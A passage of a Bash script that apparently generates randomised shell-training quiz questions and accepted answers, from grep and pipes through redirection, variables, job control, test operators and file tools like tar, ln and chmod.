  _fpick SANDBOX_CFGS; cfg=$REPLY; _fpick SANDBOX_CFGS; cfg2=$REPLY
  _fpick SANDBOX_CSVS; csv=$REPLY
  # Match terms to file types to ensure grep always finds results
  local _log_type="app"
  [[ $log == server.log || $log == logs/access.log ]] && _log_type="nginx"
  if [[ $_log_type == "nginx" ]]; then
    _fphrase GET POST 200 404 500; term1=$REPLY
  else
    _fphrase ERROR WARN INFO DEBUG; term1=$REPLY
  fi
  if [[ $txt == todo.txt ]]; then
    _fphrase Review Deploy Update; term2=$REPLY
  else
    _fphrase TODO Review Deploy Update Schedule; term2=$REPLY
  fi
  # Terms present in both config.ini and settings.yaml
  _fphrase server database logging cache host port localhost info enabled; term3=$REPLY

  # ls | wc variants (hint at pipe since this level teaches pipes)
  questions+=("Count items in current directory (pipe ${Y}ls${C} to ${Y}wc${C})§ls | wc -l§ls -1 | wc -l")

  # grep basics
  questions+=("$(_phrase "Search for" "Find") ${Y}${term1}${C} in ${W}${log}${C}§grep ${term1} ${log}§#output:~${term1}")
  questions+=("Find ${Y}${term2}${C} in ${W}${txt}${C}§grep ${term2} ${txt}§#output:~${term2}")
  questions+=("Search ${W}${cfg}${C} for ${Y}${term3}${C}§grep ${term3} ${cfg}§#output:~${term3}")

  # grep -c (count)
  questions+=("Count ${Y}${term2}${C} matches in ${W}${txt}${C}§grep -c ${term2} ${txt}")
  questions+=("Count ${Y}${term1}${C} occurrences in ${W}${log}${C}§grep -c ${term1} ${log}")

  # grep -i (case insensitive)
  questions+=("Find ${Y}${term1}${C} case-insensitive in ${W}${log}${C}§grep -i ${term1} ${log}")
  questions+=("Search ${W}${txt}${C} for ${Y}${term2}${C} ignoring case§grep -i ${term2} ${txt}")

  # grep -v (invert)
  questions+=("Show lines NOT containing ${Y}${term1}${C} in ${W}${log}${C}§grep -v ${term1} ${log}")
  questions+=("Exclude ${Y}${term2}${C} lines from ${W}${txt}${C}§grep -v ${term2} ${txt}")

  # sort variants
  questions+=("Sort ${W}${txt}${C} alphabetically§sort ${txt}")
  questions+=("Sort ${W}${cfg}${C} in reverse§sort -r ${cfg}")
  questions+=("Sort ${W}${csv}${C} numerically§sort -n ${csv}")
  questions+=("Sort ${W}${txt2}${C} and remove duplicates§sort ${txt2} | uniq§sort -u ${txt2}")
  questions+=("Unique sorted lines from ${W}${txt}${C}§sort -u ${txt}§sort ${txt} | uniq")

  # Combined pipes
  questions+=("First ${n} ${Y}${term1}${C} matches in ${W}${log}${C}§grep ${term1} ${log} | head -${n}§#output:~${term1}")
  questions+=("Last ${n2} ${Y}${term1}${C} lines in ${W}${log}${C}§grep ${term1} ${log} | tail -${n2}§#output:~${term1}")
  questions+=("Count unique lines in ${W}${txt}${C}§sort ${txt} | uniq | wc -l§sort -u ${txt} | wc -l")
  questions+=("Sort ${W}${log}${C} and show first ${n}§sort ${log} | head -${n}")
  questions+=("Show last ${n2} sorted lines of ${W}${cfg}${C}§sort ${cfg} | tail -${n2}")
  questions+=("Find ${Y}${term1}${C} lines, then count them in ${W}${log}${C}§grep ${term1} ${log} | wc -l§grep -c ${term1} ${log}")

  printf '%s\n' "${questions[@]}"
}

# Level 5: Input Redirection (<)
gen_level5() {
  local questions=() txt csv log; _ctx
  _fpick SANDBOX_TXTS; txt=$REPLY
  _fpick SANDBOX_CSVS; csv=$REPLY; _fpick SANDBOX_LOGS; log=$REPLY

  questions+=("Count lines in ${W}${csv}${C} without filename in output (use ${Y}<${C})|wc -l < ${csv}")
  questions+=("Count words in ${W}${txt}${C} — just the number, no filename (use ${Y}<${C})|wc -w < ${txt}")
  local _tr_up; case "$txt" in notes.txt) _tr_up="MEETING" ;; todo.txt) _tr_up="TASK" ;; *) _tr_up="[A-Z]" ;; esac
  questions+=("Uppercase contents of ${W}${txt}${C} (${Y}tr${C} needs ${Y}<${C}, no file arg)|tr a-z A-Z < ${txt}|#output:~${_tr_up}")
  questions+=("Squeeze consecutive blank lines in ${W}${log}${C} (${Y}tr${C} needs ${Y}<${C})|tr -s '\\n' < ${log}")
  questions+=("Sort ${W}${csv}${C} without filename in output (use ${Y}<${C})|sort < ${csv}")

  printf '%s\n' "${questions[@]}"
}

# Level 6: Here-Strings (<<<)
gen_level6() {
  local questions=() word word2
  _fphrase hello world example config backup server admin debug; word=$REPLY
  _fphrase test data input query search token ready active; word2=$REPLY

  local num1=$((RANDOM % 50 + 10)) num2=$((RANDOM % 20 + 5))

  questions+=("Uppercase ${Y}'${word}'${C} (use ${Y}<<<${C})|tr a-z A-Z <<< '${word}'|tr a-z A-Z <<< ${word}|#output:${word^^}")
  questions+=("Lowercase ${Y}'${word2^^}'${C} (use ${Y}<<<${C})|tr A-Z a-z <<< '${word2^^}'|tr A-Z a-z <<< ${word2^^}|#output:${word2}")
  local _rw="" _rw2="" _i; for ((_i=${#word}-1;_i>=0;_i--)); do _rw+="${word:_i:1}"; done
  for ((_i=${#word2}-1;_i>=0;_i--)); do _rw2+="${word2:_i:1}"; done
  questions+=("Reverse ${Y}'${word}'${C} (use ${Y}<<<${C})|rev <<< '${word}'|rev <<< ${word}|#output:~${_rw}")
  questions+=("Reverse ${Y}'${word2}'${C} (use ${Y}<<<${C})|rev <<< '${word2}'|rev <<< ${word2}|#output:~${_rw2}")

  command -v bc &>/dev/null && questions+=("Calculate ${Y}${num1}+${num2}${C} with bc|bc <<< '${num1}+${num2}'|bc <<< ${num1}+${num2}|#output:~$((num1+num2))")

  questions+=("Extract home dir from ${Y}'root:x:0:0:root:/root:/bin/bash'${C}|cut -d: -f6 <<< 'root:x:0:0:root:/root:/bin/bash'|#output:~/root")
  questions+=("Get username from ${Y}'john:x:1000:1000:John:/home/john:/bin/bash'${C}|cut -d: -f1 <<< 'john:x:1000:1000:John:/home/john:/bin/bash'|#output:~john")

  questions+=("Count words in ${Y}'${word} ${word2} test'${C}|wc -w <<< '${word} ${word2} test'|#output:~^\\s*3$")
  questions+=("Count bytes in ${Y}'${word}'${C} (use ${Y}wc${C})|wc -c <<< '${word}'|wc -c <<< ${word}|#output:~^\\s*$((${#word}+1))$")

  questions+=("Replace spaces with underscores in ${Y}'hello world test'${C}|tr ' ' '_' <<< 'hello world test'|#output:~hello_world_test")
  questions+=("Delete digits from ${Y}'abc123def456'${C}|tr -d '0-9' <<< 'abc123def456'|#output:~abcdef")

  printf '%s\n' "${questions[@]}"
}

# Level 7: Error Redirection (2>, &>, 2>&1)
gen_level7() {
  local questions=() script script2 ext ext2 errfile errfile2 outfile outfile2 log missing missing2; _ctx
  _fpick SANDBOX_SCRIPTS; script=$REPLY; _fpick SANDBOX_SCRIPTS; script2=$REPLY
  _fphrase py sh log txt; ext=$REPLY; _fphrase conf ini yaml json; ext2=$REPLY
  _fphrase errors.log err.txt stderr.log error.out; errfile=$REPLY
  _fphrase debug.err issue.log problem.txt err2.log; errfile2=$REPLY
  _fphrase output.log out.txt all.log combined.out; outfile=$REPLY
  _fphrase result.log full.txt complete.out run.log; outfile2=$REPLY
  _fpick SANDBOX_LOGS; log=$REPLY
  _fphrase old.log backup.txt archive.csv deleted.log; missing=$REPLY
  _fphrase removed.txt gone.log lost.dat missing.cfg; missing2=$REPLY

  # 2> = stderr to file
  questions+=("Save stderr from ${W}./${script}${C} to ${W}${errfile}${C} (use ${Y}2>${C})|./${script} 2> ${errfile}")
  questions+=("${Y}cat${C} ${W}${missing}${C}, save error to ${W}${errfile}${C} (use ${Y}2>${C})|cat ${missing} 2> ${errfile}|~^cat [^ ]+ 2> ?${errfile}$")

  # 2> /dev/null = hide errors
  questions+=("Find ${Y}*.${ext}${C} files, hide errors (use ${Y}2> /dev/null${C})|find . -name '*.${ext}' 2> /dev/null")
  questions+=("Run ${W}./${script}${C} but hide errors (use ${Y}2> /dev/null${C})|./${script} 2> /dev/null")

  # &> = both stdout+stderr
  questions+=("Capture stdout+stderr from ${W}./${script}${C} to ${W}${outfile}${C} (use ${Y}&>${C})|./${script} &> ${outfile}|./${script} > ${outfile} 2>&1")
  questions+=("Run ${W}./${script}${C} completely silently (use ${Y}&> /dev/null${C})|./${script} &> /dev/null|./${script} > /dev/null 2>&1")

  # 2>&1 = merge stderr into stdout
  questions+=("Run ${W}./${script}${C}, search ALL output for 'error'§./${script} 2>&1 | grep -i error§~^\\./[^ ]+ 2>&1 \\| grep -i")
  questions+=("Run ${W}./${script2}${C}, pipe all output to ${Y}less${C}§./${script2} 2>&1 | less§#text:")
  questions+=("Run ${W}./${script}${C}, count total lines (stdout+stderr)§./${script} 2>&1 | wc -l")

  # Separate files for stdout and stderr
  questions+=("Save output to ${W}${outfile}${C}, errors to ${W}${errfile}${C}|ls -la > ${outfile} 2> ${errfile}")
  questions+=("Run ${W}./${script}${C}: stdout to ${W}${outfile}${C}, stderr to ${W}${errfile}${C}|./${script} > ${outfile} 2> ${errfile}")
  questions+=("Separate ${W}./${script2}${C} output: results to ${W}${outfile2}${C}, errors to ${W}${errfile2}${C}|./${script2} > ${outfile2} 2> ${errfile2}")

  # 1>&2 = stdout to stderr (less common but useful)
  questions+=("Echo 'failed' to stderr (redirect stdout to stderr)|echo failed 1>&2|echo failed >&2|#text:")

  printf '%s\n' "${questions[@]}"
}

# Level 8: Logic Operators (&&, ||)
gen_level8() {
  local questions=() dir dir2 cfg cfg2 txt txt2 log msg msg2 script n; _ctx
  _fphrase new work build output cache proj dist bundle; dir=$REPLY
  _fphrase archive old staging release deploy results; dir2=$REPLY
  _fpick SANDBOX_CFGS; cfg=$REPLY; _fpick SANDBOX_CFGS; cfg2=$REPLY
  _fpick SANDBOX_TXTS; txt=$REPLY; _fpick SANDBOX_TXTS; txt2=$REPLY
  _fpick SANDBOX_LOGS; log=$REPLY
  _fphrase exists failed done error warning success ok; msg=$REPLY
  _fphrase ready complete skipped finished created started; msg2=$REPLY
  _fpick SANDBOX_SCRIPTS; script=$REPLY
  n=$((RANDOM % 5 + 3))
  _fphrase ERROR WARN INFO DEBUG; local term=$REPLY
  _fphrase src data logs backup temp config test; local sdir=$REPLY

  # === PURE: Just && and || basics ===
  questions+=("Create ${W}${dir}${C} and cd into it (use ${Y}&&${C})|mkdir ${dir} && cd ${dir}")
  questions+=("Create ${W}${dir}${C} or echo '${msg}' if fails (use ${Y}||${C})§mkdir ${dir} || echo '${msg}'")
  questions+=("Try cd to ${W}${dir}${C}, create if it doesn't exist§cd ${dir} || mkdir ${dir}")

  # === COMPOUND: Uses cat (L2), head (L2), tail (L2) ===
  questions+=("If ${W}${txt}${C} exists, display it (use ${Y}&&${C})|test -f ${txt} && cat ${txt}|[[ -f ${txt} ]] && cat ${txt}")
  questions+=("If ${W}${log}${C} exists, show first ${n} lines|test -f ${log} && head -${n} ${log}|[[ -f ${log} ]] && head -${n} ${log}")
  questions+=("If ${W}${txt}${C} exists cat it, else echo '${msg}'§test -f ${txt} && cat ${txt} || echo '${msg}'§[[ -f ${txt} ]] && cat ${txt} || echo '${msg}'")

  # === COMPOUND: Uses grep (L3), pipes (L3) ===
  questions+=("If ${W}${log}${C} has ${Y}${term}${C}, show matching lines§grep -q ${term} ${log} && grep ${term} ${log}")
  questions+=("Search ${Y}${term}${C} in ${W}${log}${C}, or echo 'not found'§grep ${term} ${log} || echo 'not found'")
  questions+=("If ${W}${log}${C} contains ${Y}${term}${C}, count the matches§grep -q ${term} ${log} && grep -c ${term} ${log}")
  questions+=("Show ${Y}${term}${C} lines from ${W}${log}${C} if any, else show all§grep ${term} ${log} || cat ${log}")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("Backup ${W}${cfg}${C} if it exists, then log success|test -f ${cfg} && cp ${cfg} ${cfg}.bak && echo done >> backup.log")
  questions+=("Copy ${W}${txt}${C} to backup and echo '${msg2}'|cp ${txt} ${txt}.bak && echo '${msg2}'")
  questions+=("Run ${W}./${script}${C} silently, echo success or failed§./${script} &>/dev/null && echo success || echo failed")
  questions+=("Run ${W}./${script}${C}, save output or log error§./${script} > output.txt || echo 'failed' >> errors.log")

  # === COMPOUND: Uses ls (L0), test + cat/head combo ===
  questions+=("If ${W}${sdir}${C} exists, list contents|test -d ${sdir} && ls ${sdir}|[[ -d ${sdir} ]] && ls ${sdir}")
  questions+=("List ${W}${dir}${C} or create it if missing§ls ${dir} || mkdir ${dir}")
  questions+=("Create ${W}${dir}${C} and save listing to files.txt§mkdir -p ${dir} && ls ${dir} > files.txt")
  questions+=("If ${W}${cfg}${C} is readable, cat it; else echo 'denied'§test -r ${cfg} && cat ${cfg} || echo 'denied'§[[ -r ${cfg} ]] && cat ${cfg} || echo 'denied'")

  # === COMPOUND: Multi-step pipelines with logic ===
  questions+=("Check if ${W}${log}${C} has ${Y}${term}${C}, show first ${n} matches§grep -q ${term} ${log} && grep ${term} ${log} | head -${n}")
  questions+=("If ${W}${txt}${C} exists, sort and save to sorted.txt§test -f ${txt} && sort ${txt} > sorted.txt")
  questions+=("Search ${Y}${term}${C} in ${W}${log}${C}, save matches or echo 'none'§grep ${term} ${log} > matches.txt || echo 'none'")

  # === Semicolon: run commands sequentially regardless of exit status ===
  questions+=("Run pwd, ls, date in sequence (use ${Y};${C})|pwd ; ls ; date")

  printf '%s\n' "${questions[@]}"
}

# Level 9: Variables & Substitution
gen_level9() {
  local questions=() txt txt2 log cfg var var2 var3 val val2 term n; _ctx
  _fpick SANDBOX_TXTS; txt=$REPLY; _fpick SANDBOX_TXTS; txt2=$REPLY
  _fpick SANDBOX_LOGS; log=$REPLY; _fpick SANDBOX_CFGS; cfg=$REPLY
  _fphrase msg name data result value output status; var=$REPLY
  _fphrase now time today count num lines; var2=$REPLY
  _fphrase tmp dir file path prefix backup; var3=$REPLY
  _fphrase hello world test ready done success running active; val=$REPLY
  _fphrase config debug enabled production staging offline; val2=$REPLY
  _fphrase ERROR WARN INFO DEBUG; term=$REPLY; n=$((RANDOM % 5 + 3))

  # === PURE: Just variables and substitution basics ===
  questions+=("Store '${val}' in variable ${var}|${var}=${val}|${var}='${val}'|${var}=\"${val}\"")
  questions+=("$(_phrase "Print" "Echo" "Show") variable \$${var}|echo \$${var}")
  questions+=("Store date output in ${var2} (use ${Y}\$()${C})|${var2}=\$(date)")
  questions+=("Store hostname in variable (use ${Y}\$()${C})|${var}=\$(hostname)")
  questions+=("Print length of \$${var}|echo \${#${var}}")
  questions+=("Print \$${var} or 'default' if empty|echo \${${var}:-default}")

  # === COMPOUND: Uses wc/head/tail (L2), input redir (L4) ===
  questions+=("Store line count of ${W}${txt}${C} in variable|${var2}=\$(wc -l < ${txt})")
  questions+=("Store word count of ${W}${txt2}${C} in ${var2}|${var2}=\$(wc -w < ${txt2})")
  questions+=("Store first line of ${W}${log}${C} in ${var}|${var}=\$(head -1 ${log})")
  questions+=("Store last line of ${W}${log}${C} in ${var}|${var}=\$(tail -1 ${log})")
  questions+=("Show 'Lines:' with line count of ${W}${txt}${C}§echo \"Lines: \$(wc -l < ${txt})\"")

  # === COMPOUND: Uses grep (L3), pipes (L3) ===
  questions+=("Store count of ${Y}${term}${C} matches in ${W}${log}${C} in ${var2}§${var2}=\$(grep -c ${term} ${log})")
  questions+=("Store first ${Y}${term}${C} line from ${W}${log}${C}§${var}=\$(grep ${term} ${log} | head -1)")
  questions+=("Count unique lines in ${W}${txt}${C} and store in variable§${var2}=\$(sort ${txt} | uniq | wc -l)")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("Backup ${W}${txt}${C} with date suffix|cp ${txt} ${txt}.\$(date +%Y%m%d)")
  questions+=("Create dir named with today's date|mkdir \$(date +%Y-%m-%d)")
  questions+=("Save grep results, echo count found in ${W}${log}${C}§grep ${term} ${log} > matches.txt && echo \"Found: \$(wc -l < matches.txt)\"")

  # === COMPOUND: Uses && || (L6) ===
  questions+=("Check file exists, store line count or 0 in ${W}${txt}${C}§${var2}=\$(test -f ${txt} && wc -l < ${txt} || echo 0)")
  questions+=("Store hostname, then echo if set§${var}=\$(hostname) && echo \"Host: \$${var}\"")

  # === COMPOUND: Complex substitution chains ===
  questions+=("Print today's date inline|echo \"Today is \$(date +%Y-%m-%d)\"")
  questions+=("Echo 'User is' followed by username|echo \"User is \$(whoami)\"")
  questions+=("Print hostname and current directory§echo \"Host: \$(hostname), Dir: \$(pwd)\"")
  questions+=("Show file info: name, lines, words in ${W}${txt}${C}§echo \"${txt}: \$(wc -l < ${txt}) lines, \$(wc -w < ${txt}) words\"")

  # === COMPOUND: Variable with earlier skills ===
  questions+=("Store sorted unique lines from ${W}${txt}${C} in variable§${var}=\$(sort -u ${txt})")
  questions+=("Store first ${n} lines of ${W}${log}${C}|${var}=\$(head -${n} ${log})")
  questions+=("Echo path: /home/\$USER|echo \"/home/\$USER\"|echo /home/\$USER")

  # === export and unset ===
  questions+=("Export ${var} for child processes|export ${var}|export ${var}=${val}")
  questions+=("Set and export ${var2} in one command|export ${var2}='${val2}'")
  questions+=("Remove variable ${var} (use ${Y}unset${C})|unset ${var}")
  questions+=("Show all exported variables|export|env|printenv")

  printf '%s\n' "${questions[@]}"
}

# Level 10: Special Variables ($$, $?, $!)
gen_level10() {
  local questions=() n n2 script log txt; _ctx
  n=$((RANDOM % 3 + 2)); n2=$((RANDOM % 4 + 3))
  _fpick SANDBOX_SCRIPTS; script=$REPLY; _fpick SANDBOX_LOGS; log=$REPLY; _fpick SANDBOX_TXTS; txt=$REPLY
  _fphrase ERROR WARN INFO; local term=$REPLY

  # === PURE: Special variables basics ===
  questions+=("Print current shell PID (use ${Y}\$\$${C})|echo \$\$")
  questions+=("Print exit status of last command (use ${Y}\$?${C})|echo \$?")
  questions+=("Print random number (use ${Y}\$RANDOM${C})|echo \$RANDOM")
  questions+=("Show user and hostname together|echo \"\$USER@\$HOSTNAME\"")

  # === PURE: Script-context variables ===
  # These are meaningful inside scripts, tested as knowledge recall
  questions+=("In a script, print the script's own name|echo \$0")
  questions+=("In a script, print argument count|echo \$#")
  questions+=("In a script, print all arguments|echo \"\$@\"|echo \$@")
  questions+=("In a script, print the first argument|echo \$1")

  # === COMPOUND: Background PID + exit status ===
  questions+=("Start ${W}./${script}${C} in background, save its PID§./${script} & echo \$!")
  questions+=("Run grep on ${W}${log}${C}, check exit status§grep -q ${term} ${log} ; echo \$?")
  questions+=("Store exit status before it gets clobbered§status=\$? ; [[ \$status -eq 0 ]] && echo ok")
  questions+=("Test if last command succeeded (exit 0)|[[ \$? -eq 0 ]] && echo success")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("Log exit status after command in ${W}${log}${C}§grep ${term} ${log} ; echo \$? >> status.log")
  questions+=("Print 'failed' to stderr if command fails§ls /nonexistent 2>/dev/null ; [[ \$? -ne 0 ]] && echo failed >&2")

  # === COMPOUND: Environment variables with commands ===
  questions+=("List files in home directory using \$HOME|ls \$HOME")
  questions+=("Create file in home using \$HOME|touch \$HOME/test.txt")
  questions+=("Search in user's home for ${Y}${term}${C}§grep -r ${term} \$HOME 2>/dev/null | head -5")

  printf '%s\n' "${questions[@]}"
}

# Level 11: Job Control (&, jobs, bg, fg)
gen_level11() {
  local questions=() n n2 n3 script script2 log outfile errfile txt term; _ctx
  n=$((RANDOM % 90 + 10)); n2=$((RANDOM % 3 + 1)); n3=$((RANDOM % 60 + 30))
  _fpick SANDBOX_SCRIPTS; script=$REPLY; _fpick SANDBOX_SCRIPTS; script2=$REPLY
  _fpick SANDBOX_LOGS; log=$REPLY; _fpick SANDBOX_TXTS; txt=$REPLY
  _fphrase output.log results.txt run.log process.out; outfile=$REPLY
  _fphrase errors.log err.txt debug.log; errfile=$REPLY
  _fphrase ERROR WARN INFO; term=$REPLY

  # === PURE: Just & and job control basics ===
  questions+=("Run sleep ${n} in background (use ${Y}&${C})|sleep ${n} &")
  questions+=("Run ${W}${script}${C} in background (use ${Y}&${C})|./${script} &")
  questions+=("$(_phrase "List" "Show" "View") background jobs|jobs")
  questions+=("Bring job ${n2} to foreground|fg %${n2}")
  questions+=("$(_phrase "Send" "Move" "Put") job ${n2} to background|bg %${n2}")
  questions+=("Kill job ${n2}|kill %${n2}")
  questions+=("$(_phrase "Wait for" "Wait until") all background jobs finish|wait")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("Run ${W}${script}${C} in background, save stdout to ${W}${outfile}${C}|./${script} > ${outfile} &")
  questions+=("Run ${W}${script2}${C} in background, capture all output to ${W}${outfile}${C}|./${script2} &> ${outfile} &|./${script2} > ${outfile} 2>&1 &")
  questions+=("Run ${W}${script}${C} in background, stdout to ${W}${outfile}${C}, stderr to ${W}${errfile}${C}|./${script} > ${outfile} 2> ${errfile} &")
  questions+=("Run ${W}${script}${C} silently in background|./${script} &>/dev/null &|./${script} >/dev/null 2>&1 &")

  # === COMPOUND: Uses && || (L6) ===
  questions+=("Run ${W}${script}${C} in background and echo 'started'|./${script} & echo started")
  questions+=("Wait for all jobs, then echo 'done'|wait && echo done")
  questions+=("Kill job ${n2}, echo 'killed' on success|kill %${n2} && echo killed")

  # === COMPOUND: Uses special vars (L8) with job control ===
  questions+=("Run ${W}${script}${C} in background, save its PID§./${script} & echo \"PID: \$!\"")
  questions+=("Start sleep in background, show PID|sleep 60 & echo \$!")
  questions+=("Run ${W}${script}${C} in background and wait for it by PID§./${script} & pid=\$! && wait \$pid")
  questions+=("Start ${W}${script}${C} in background, save PID to file§./${script} & echo \$! > pid.txt")

  # === COMPOUND: Uses cat/grep (L2, L3) with job control ===
  questions+=("Run ${W}${script}${C} in background, later grep output in ${W}${outfile}${C}§./${script} > ${outfile} & sleep 1 && grep ${term} ${outfile}")
  questions+=("Tail ${W}${log}${C} in background|tail -f ${log} &")
  questions+=("Run grep in background, save matches to ${W}${log}${C}|grep ${term} ${log} > matches.txt &")

  # === COMPOUND: Advanced job control ===
  questions+=("Disown job ${n2} (detach from shell)|disown %${n2}")
  questions+=("Wait for job ${n2} specifically|wait %${n2}")
  questions+=("Bring most recent job to foreground|fg|fg %%")
  questions+=("Continue stopped job in background|bg")

  printf '%s\n' "${questions[@]}"
}

# Level 12: Test Operators ([[ -f ]], [[ -d ]], etc)
gen_level12() {
  local questions=() txt txt2 cfg cfg2 log script dir dir2 n n2 n3 term; _ctx
  _fpick SANDBOX_TXTS; txt=$REPLY; _fpick SANDBOX_TXTS; txt2=$REPLY
  _fpick SANDBOX_CFGS; cfg=$REPLY; _fpick SANDBOX_CFGS; cfg2=$REPLY
  _fpick SANDBOX_LOGS; log=$REPLY; _fpick SANDBOX_SCRIPTS; script=$REPLY
  _fphrase src data logs backup; dir=$REPLY; _fphrase temp cache build output; dir2=$REPLY
  n=$((RANDOM % 90 + 10)); n2=$((RANDOM % 50 + 5)); n3=$((RANDOM % 5 + 3))
  _fphrase ERROR WARN INFO DEBUG; term=$REPLY

  # === PURE: Test operator basics ===
  questions+=("Test if ${W}${txt}${C} exists and is a file|[[ -f ${txt} ]]|test -f ${txt}")
  questions+=("Test if ${W}${dir}${C} exists and is a directory|[[ -d ${dir} ]]|test -d ${dir}")
  questions+=("Test if ${W}${txt}${C} is readable|[[ -r ${txt} ]]|test -r ${txt}")
  questions+=("Test if ${W}${script}${C} is executable|[[ -x ${script} ]]|test -x ${script}")
  questions+=("Test if ${W}${txt}${C} is non-empty|[[ -s ${txt} ]]|test -s ${txt}")
  questions+=("Test if \$var is empty|[[ -z \"\$var\" ]]")
  questions+=("Test if \$var is NOT empty|[[ -n \"\$var\" ]]")
  questions+=("Test if \$num is greater than ${n}|[[ \$num -gt ${n} ]]")

  # === COMPOUND: Uses cat (L2) ===
  questions+=("If ${W}${txt}${C} is readable, display it|[[ -r ${txt} ]] && cat ${txt}")
  questions+=("If ${W}${cfg}${C} exists and readable, show with line numbers|[[ -f ${cfg} && -r ${cfg} ]] && cat -n ${cfg}")

  # === COMPOUND: Uses head/tail (L2) ===
  questions+=("If ${W}${log}${C} exists, show first ${n3} lines|[[ -f ${log} ]] && head -${n3} ${log}|[[ -f ${log} ]] && head -n ${n3} ${log}")
  questions+=("If ${W}${log}${C} has content, show last ${n3} lines|[[ -s ${log} ]] && tail -${n3} ${log}|[[ -s ${log} ]] && tail -n ${n3} ${log}")

  # === COMPOUND: Uses grep (L3), pipes (L3) ===
  questions+=("If ${W}${log}${C} exists, search for ${Y}${term}${C}|[[ -f ${log} ]] && grep ${term} ${log}")
  questions+=("If ${W}${log}${C} is non-empty, count ${Y}${term}${C} matches|[[ -s ${log} ]] && grep -c ${term} ${log}")
  questions+=("Test if ${W}${log}${C} contains ${Y}${term}${C}§[[ -f ${log} ]] && grep -q ${term} ${log}")

  # === COMPOUND: Uses redirection (L1, L5) ===
  questions+=("If ${W}${txt}${C} is writable, append timestamp|[[ -w ${txt} ]] && date >> ${txt}")
  questions+=("If ${W}${script}${C} is executable, run and log output|[[ -x ${script} ]] && ./${script} > output.log 2>&1")
  questions+=("Test if ${W}${dir}${C} exists, create if not§[[ -d ${dir} ]] || mkdir -p ${dir}")

  # === COMPOUND: Uses && || (L6) ===
  questions+=("If ${W}${txt}${C} exists cat it, else echo 'missing'§[[ -f ${txt} ]] && cat ${txt} || echo 'missing'")
  questions+=("If ${W}${cfg}${C} is writable, backup it and echo done|[[ -w ${cfg} ]] && cp ${cfg} ${cfg}.bak && echo done")
  questions+=("Check ${W}${txt}${C} exists or exit with error§[[ -f ${txt} ]] || { echo 'not found' >&2; exit 1; }")

  # === COMPOUND: Numeric tests with variables (L8) ===
  questions+=("If ${W}${txt}${C} line count > ${n2}, show first ${n3} lines§lines=\$(wc -l < ${txt}); [[ \$lines -gt ${n2} ]] && head -${n3} ${txt}")
  questions+=("Test if ${W}${txt}${C} has more than ${n2} words§[[ \$(wc -w < ${txt}) -gt ${n2} ]]")

  # === Combined/advanced tests ===
  questions+=("Test if ${W}${txt}${C} exists AND is readable|[[ -f ${txt} && -r ${txt} ]]")
  questions+=("Test if ${W}${txt}${C} OR ${W}${cfg}${C} exists§[[ -f ${txt} || -f ${cfg} ]]")
  questions+=("Test if ${W}${txt}${C} does NOT exist|[[ ! -f ${txt} ]]|test ! -f ${txt}")
  questions+=("Test if ${W}${txt}${C} is newer than ${W}${cfg}${C}|[[ ${txt} -nt ${cfg} ]]")

  printf '%s\n' "${questions[@]}"
}

# Level 13: Core File Tools
gen_level13() {
  eval "local questions=() $_QV"; _ctx
  local perm1=$((RANDOM % 8))$((RANDOM % 8))$((RANDOM % 8))
  _fphrase ERROR WARN INFO DEBUG; local searchterm=$REPLY
  [[ "$cfg2" == "$cfg" ]] && { _fpick CONFIGS; cfg2=$REPLY; }
  [[ "$txt2" == "$txt" ]] && { _fpick TXTS; txt2=$REPLY; }

  # === PURE: Basic file operations ===
  questions+=("Concatenate ${txt} and ${txt2} together|cat ${txt} ${txt2}")

  # Listing files
  questions+=("List sorted by size, largest first|ls -lS|ls -Sl|eza -l --sort size -r")
  questions+=("List sorted by time, newest first|ls -lt|ls -tl|eza -l --sort modified")
  questions+=("List only directories|ls -d */|eza -D")
  questions+=("Show directory tree|tree|eza -T")
  questions+=("Tree ${n3} levels deep|tree -L ${n3}|eza -T -L ${n3}")
  questions+=("Long listing with human sizes|ls -lh|ls -hl|eza -lh")
  questions+=("List one file per line|ls -1")
  questions+=("List ${dir}/ recursively|ls -R ${dir}/|eza -R ${dir}/")

  # File operations
  questions+=("Count lines in ${csv}|wc -l ${csv}|wc -l < ${csv}")
  questions+=("Count words in ${txt}|wc -w ${txt}")
  questions+=("Count bytes in ${txt}|wc -c ${txt}")
  questions+=("Copy ${cfg} to ${cfg2}|cp ${cfg} ${cfg2}")
  questions+=("Copy ${dir}/ recursively to ${dir2}/|cp -r ${dir}/ ${dir2}/|cp -R ${dir}/ ${dir2}/")
  questions+=("Move ${txt} to ${dir}/|mv ${txt} ${dir}/")
  questions+=("Rename ${cfg} to ${cfg2}|mv ${cfg} ${cfg2}")

  # Disk usage
  questions+=("Disk usage of current dir, human readable|du -sh .|du -hs .|dust")
  questions+=("Disk usage of each subdir|du -sh */|du -hs */|dust -d 1")

  # Archives (tar) - only use .tar.gz since answers use gzip flags
  local -a GZ_ARCHIVES=(backup.tar.gz archive.tar.gz files.tgz release.tar.gz package.tar.gz source.tar.gz logs.tar.gz)
  _fpick GZ_ARCHIVES; local gz_archive=$REPLY
  questions+=("Extract ${gz_archive}|tar xzf ${gz_archive}|tar -xzf ${gz_archive}")
  questions+=("Extract ${gz_archive} to ${dir}/|tar xzf ${gz_archive} -C ${dir}/|tar -xzf ${gz_archive} -C ${dir}/")
  questions+=("Create archive.tar.gz from ${dir}/|tar czf archive.tar.gz ${dir}/|tar -czf archive.tar.gz ${dir}/")
  questions+=("List contents of ${gz_archive} without extracting|tar tzf ${gz_archive}|tar -tzf ${gz_archive}|tar tf ${gz_archive}")

  # Symlinks
  questions+=("Create symlink 'link' pointing to ${cfg}|ln -s ${cfg} link")
  questions+=("Create symlink 'link' to ${cfg} using absolute path|ln -s \$(pwd)/${cfg} link")
  questions+=("$(_phrase "Show" "Display" "Print") where symlink points|readlink link|ls -l link")
  questions+=("Remove symlink (not target)|rm link|unlink link")
  questions+=("Create hard link 'hardlink' pointing to ${txt}|ln ${txt} hardlink")
  questions+=("Follow symlink to find real path|readlink -f link")

  # Permissions - dynamic octal modes
  questions+=("Make ${script} executable|chmod +x ${script}")
  questions+=("Set ${script} to rwxr-xr-x (755)|chmod 755 ${script}")
  questions+=("Set ${cfg} to rw-r--r-- (644)|chmod 644 ${cfg}")
  questions+=("Set ${txt} permissions to ${perm1}|chmod ${perm1} ${txt}")
  questions+=("Add write permission for group in ${W}${cfg}${C}|chmod g+w ${cfg}")
  questions+=("Remove all permissions for others in ${W}${cfg}${C}|chmod o-rwx ${cfg}|chmod o= ${cfg}")
